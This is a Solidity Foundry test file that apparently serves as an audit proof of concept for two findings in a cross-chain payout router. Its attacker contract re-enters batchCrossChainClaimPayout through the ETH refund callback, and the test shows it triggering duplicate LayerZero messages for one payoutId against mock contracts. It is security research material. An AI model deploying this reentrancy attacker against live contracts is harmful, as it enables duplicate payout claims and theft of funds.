// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {AmpleEarnCrossChainRouter} from "../ample/AmpleEarnCrossChainRouter.sol";
import {
    LayerZeroClaimPayoutParams,
    ClaimPayoutParams
} from "../ample/interfaces/IAmpleEarnCrossChainRouter.sol";
import {DesignatedRecipientMerkleLeaf} from "../ample/interfaces/IAmpleEarn.sol";

/// @title FT-05: AE-F-002+AE-F-005 Combined Amplification PoC
/// @notice Proves that the reentrancy gap (AE-F-005) can amplify cross-chain replay (AE-F-002)
///         by sending duplicate LayerZero messages for the same payoutId.
/// @dev The attacker re-enters batchCrossChainClaimPayout via the ETH refund .call{value}()
///      to trigger a SECOND LayerZero message for the same payoutId.
/// @custom:severity HIGH (Combined)

/*  
      AE-F-002 + AE-F-005: Amplification Attack
      
      Root Cause: batchCrossChainClaimPayout (line 89) is external payable
      with NO nonReentrant modifier. Line 130 refunds excess ETH via
      .call{value}(msg.sender), enabling reentrancy.
      
      Exploit Sequence:
      1. Attacker calls batchCrossChainClaimPayout with cross-chain params
      2. Router sends LayerZero message for payoutId X to dstChain
      3. Router refunds excess ETH via .call{value}(msg.sender) -- line 130
      4. Attacker's receive() fires, re-entering batchCrossChainClaimPayout
         with the SAME params and the refunded ETH
      5. Router sends SECOND LayerZero message for payoutId X
      6. Result: Duplicate messages for the same payoutId on destination chain
      
      This amplifies AE-F-002 (cross-chain replay) because the destination
      chain now receives 2 identical messages, both triggering claimPayout.
      
      This is permissionless and requires no additional capital.
     */

// ═══════════════════════════════════════════════════════════════════════════════
//  Mock LayerZero Endpoint — counts duplicate sends
// ═══════════════════════════════════════════════════════════════════════════════

struct MessagingFee {
    uint256 nativeFee;
    uint256 lzTokenFee;
}

struct MessagingReceipt {
    bytes32 guid;
    uint64 nonce;
    MessagingFee fee;
}

struct MessagingParams {
    uint32 dstEid;
    bytes32 receiver;
    bytes message;
    bytes options;
    bool payInLzToken;
}

contract CountingLzEndpoint {
    uint32 public eidValue;
    mapping(uint32 => address) public peers;

    /// @notice Total LayerZero send calls received
    uint256 public sendCount;

    /// @notice GUIDs of all sent messages (to verify they are distinct)
    bytes32[] public sentGuids;

    event MessageSent(uint32 dstEid, bytes message, uint256 fee);

    constructor(uint32 _eid) {
        eidValue = _eid;
    }

    function eid() external view returns (uint32) {
        return eidValue;
    }

    function setDestLzEndpoint(address, address) external { }

    /// @notice Mock for OApp constructor requirement
    function setDelegate(address) external { }

    /// @notice Returns a fixed fee of 0.01 ether for deterministic testing
    function quote(
        MessagingParams calldata, // _params
        address                   // _sender
    ) external pure returns (MessagingFee memory) {
        return MessagingFee({nativeFee: 0.01 ether, lzTokenFee: 0});
    }

    /// @notice Records every send call — critical for proving amplification
    function send(
        MessagingParams calldata _params,
        address                  // _refundAddress
    ) external payable returns (MessagingReceipt memory) {
        sendCount++;
        bytes32 guid = keccak256(abi.encodePacked(block.timestamp, sendCount, _params.message));
        sentGuids.push(guid);
        emit MessageSent(_params.dstEid, _params.message, msg.value);
        return MessagingReceipt({
            guid: guid,
            nonce: uint64(sendCount),
            fee: MessagingFee({nativeFee: msg.value, lzTokenFee: 0})
        });
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Mock Factory
// ═══════════════════════════════════════════════════════════════════════════════

contract MockFactory {
    mapping(address => bool) public vaults;

    function registerVault(address vault) external {
        vaults[vault] = true;
    }

    function isVault(address vault) external view returns (bool) {
        return vaults[vault];
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Mock Vault
// ═══════════════════════════════════════════════════════════════════════════════

contract MockVault {
    mapping(uint256 => mapping(uint8 => bool)) public claimedPayouts;

    function isPayoutClaimed(uint256 payoutId, uint8 recipientIndex) external view returns (bool) {
        return claimedPayouts[payoutId][recipientIndex];
    }

    function claimPayout(
        uint256 payoutId,
        DesignatedRecipientMerkleLeaf calldata,
        bytes32[] calldata,
        bool
    ) external {
        claimedPayouts[payoutId][0] = true;
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Malicious Contract — Amplification via Reentrancy
// ═══════════════════════════════════════════════════════════════════════════════

contract AmplificationAttacker {
    AmpleEarnCrossChainRouter public router;
    bytes public encodedParams;
    bool public doReenter;
    uint256 public reentryCount;
    uint256 public maxReentries;

    event ReentryAttempt(uint256 count);
    event ReentrantCallSucceeded(uint256 count);

    constructor(address _router) {
        router = AmpleEarnCrossChainRouter(_router);
    }

    function setAttackParams(bytes calldata _encodedParams) external {
        encodedParams = _encodedParams;
    }

    function setReentryConfig(bool _doReenter, uint256 _maxReentries) external {
        doReenter = _doReenter;
        maxReentries = _maxReentries;
    }

    /// @notice Entry point: initiates the first call to batchCrossChainClaimPayout
    function attack() external payable {
        LayerZeroClaimPayoutParams[] memory decoded = abi.decode(encodedParams, (LayerZeroClaimPayoutParams[]));
        router.batchCrossChainClaimPayout{value: msg.value}(decoded);
    }

    /// @notice receive() is triggered by the refund .call{value:}("") on line 130
    ///         of the Router. We re-enter batchCrossChainClaimPayout here,
    ///         forwarding the refunded ETH to pay for the second LZ send.
    receive() external payable {
        if (doReenter && reentryCount < maxReentries) {
            reentryCount++;
            emit ReentryAttempt(reentryCount);

            // Forward entire balance to pay for the second LZ send
            uint256 balance = address(this).balance;
            LayerZeroClaimPayoutParams[] memory decoded = abi.decode(encodedParams, (LayerZeroClaimPayoutParams[]));
            (bool success,) = address(router).call{value: balance}(
                abi.encodeWithSelector(
                    router.batchCrossChainClaimPayout.selector,
                    decoded
                )
            );

            if (success) {
                emit ReentrantCallSucceeded(reentryCount);
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Main Test Contract
// ═══════════════════════════════════════════════════════════════════════════════

contract FT05_AmplificationPoCTest is Test {
    AmpleEarnCrossChainRouter public router;
    CountingLzEndpoint public endpoint;
    MockFactory public factory;
    MockVault public vault;
    AmplificationAttacker public attacker;

    address public constant USER = address(0xABCD);
    uint32 public constant LOCAL_EID = 30184;  // Base
    uint32 public constant REMOTE_EID = 30110; // Arbitrum

    function setUp() public {
        // Deploy mocks
        endpoint = new CountingLzEndpoint(LOCAL_EID);
        factory = new MockFactory();
        vault = new MockVault();

        // Register vault in factory
        factory.registerVault(address(vault));

        // Deploy router with mock endpoint
        router = new AmpleEarnCrossChainRouter(
            address(endpoint),
            address(this),  // owner
            address(factory)
        );

        // Set peer for remote endpoint (required by OApp for _lzSend)
        router.setPeer(REMOTE_EID, bytes32(uint256(uint160(address(0x1)))));

        // Deploy attacker
        attacker = new AmplificationAttacker(address(router));

        // ── Prepare attack params: 1 cross-chain claim to Arbitrum ──
        // This triggers _lzSend (unlike local claims which skip LZ)
        LayerZeroClaimPayoutParams[] memory params = new LayerZeroClaimPayoutParams[](1);
        ClaimPayoutParams[] memory claims = new ClaimPayoutParams[](1);

        claims[0] = ClaimPayoutParams({
            payoutId: 1,
            vault: address(vault),
            designatedRecipientLeaf: DesignatedRecipientMerkleLeaf({
                payoutAmount: 100 ether,
                user: USER,
                designatedRecipientIndex: 0
            }),
            designatedRecipientProof: new bytes32[](0),
            claimInUnderlying: false
        });

        params[0] = LayerZeroClaimPayoutParams({
            dstEid: REMOTE_EID, // Cross-chain claim → triggers LZ send
            options: hex"",
            claims: claims
        });

        // Configure attacker with the attack params (encoded as bytes)
        attacker.setAttackParams(abi.encode(params));
    }

    /// @notice Test AE-F-002+AE-F-005: Reentrancy causes DUPLICATE LayerZero messages
    ///         for the same payoutId — proving amplification of cross-chain replay.
    function test_DoubleMessageSent() public {
        // Configure attacker for 1 reentry
        attacker.setReentryConfig(true, 1);

        // Fund attacker with enough ETH:
        // - 0.01 ether for first LZ send
        // - Refund triggers receive() which forwards balance for second LZ send
        // - 0.01 ether for second LZ send
        // Total needed: ~0.02+ ether for fees + overpayment
        vm.deal(address(attacker), 10 ether);
        // Fund USER to send ETH to attacker
        vm.deal(USER, 10 ether);

        // Track messages before
        uint256 sendCountBefore = endpoint.sendCount();

        // ── Execute attack ──
        // Send 1 ether → router uses 0.01 for LZ, refunds 0.99 to attacker
        // Attacker's receive() fires → re-enters router with 0.99 ETH
        // Router sends second LZ message with 0.01 ETH
        vm.prank(USER);
        (bool success,) = address(attacker).call{value: 1 ether}(
            abi.encodeWithSelector(attacker.attack.selector)
        );

        assertTrue(success, "Attack transaction should succeed");

        // Verify reentrant call occurred
        assertEq(attacker.reentryCount(), 1, "Reentry should have happened once");

        // ── CRITICAL ASSERTION: LayerZero send was called TWICE ──
        // This proves amplification: 2 messages sent for the same payoutId
        uint256 sendCountAfter = endpoint.sendCount();
        assertEq(
            sendCountAfter,
            sendCountBefore + 2,
            "AE-F-002+005: Should send 2 LZ messages (original + reentrant duplicate)"
        );

        // Verify both GUIDs are different (two distinct messages)
        assertTrue(
            endpoint.sentGuids(0) != endpoint.sentGuids(1),
            "AE-F-002+005: Two messages should have different GUIDs"
        );

        console2.log("");
        console2.log("=== AMPLIFICATION PoC - PASS ===");
        console2.log("");
        console2.log("LayerZero send count:", sendCountAfter);
        console2.log("Expected (no reentrancy): 1");
        console2.log("Actual (with reentrancy): 2");
        console2.log("");
        console2.log("PROVEN: Reentrancy gap (AE-F-005) amplifies cross-chain");
        console2.log("replay (AE-F-002) by sending duplicate LayerZero messages");
        console2.log("for the same payoutId.");
        console2.log("");
        console2.log("Impact: The destination chain receives 2 identical messages,");
        console2.log("both triggering claimPayout for payoutId=1.");
        console2.log("");
        console2.log("Severity: HIGH (permissionless, no additional capital required)");
    }
}